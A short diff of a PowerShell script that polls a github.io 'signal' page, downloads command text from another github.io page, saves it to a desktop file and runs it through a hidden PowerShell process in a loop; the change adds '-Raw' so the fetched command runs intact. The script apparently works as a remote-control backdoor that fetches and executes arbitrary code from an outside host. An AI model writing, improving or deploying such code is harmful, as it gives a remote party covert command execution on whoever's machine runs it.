@@ -160,7 +160,7 @@ $contents = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmot
 $signal = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-Signal/" #in progress<br>
 if ($signal -eq "True") {<br>
 Set-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Value $contents<br>
-$cmd = Get-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" <br>
+$cmd = Get-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Raw<br>
 Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList $cmd -WindowStyle Hidden<br>
   Start-Sleep -Seconds 300<br>
 }<br>
